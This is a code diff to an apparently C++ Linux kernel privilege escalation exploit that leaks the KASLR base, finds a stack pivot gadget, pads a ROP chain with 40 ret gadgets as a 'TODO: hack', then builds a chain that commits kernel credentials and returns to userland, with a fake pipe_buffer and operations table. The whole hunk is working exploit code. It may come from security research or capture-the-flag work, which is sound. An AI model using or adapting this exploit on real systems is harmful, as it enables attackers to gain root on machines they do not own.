@@ -89,15 +89,25 @@ int main(int argc, const char** argv) {
     printf("[+] KASLR base = 0x%lx\n", kaslr_base);
     check_kaslr_base(kaslr_base);
 
+    Payload payload(1024);
+    PivotFinder pivot_finder(target.pivots, Register::RSI, payload);
+    auto ret_addr = kaslr_base + pivot_finder.GetSingleRet().address;
+
     printf("[+] ROP chain:\n");
     RopChain rop(target, kaslr_base);
+
+    // TODO: hack: fix this
+    RopAction fake_action;
+    for (int i = 0; i < 40; i++)
+        fake_action.values.push_back(ret_addr);
+    rop.actions_.push_back(fake_action);
+
     rop.AddRopAction(RopActionId::COMMIT_KERNEL_CREDS);
     RopUtils::Ret2Usr(rop, (void*)win);
     rop.Add(0xffffffff41414141);
     HexDump::Print(rop.GetData());
 
     printf("[+] Preparing fake pipe_buffer and ops\n");
-    Payload payload(1024);
 
     uint64_t release_offs = offsetof(pipe_buf_operations, release);
     uint64_t fake_ops_offs = offsetof(pipe_buffer, flags) - release_offs;
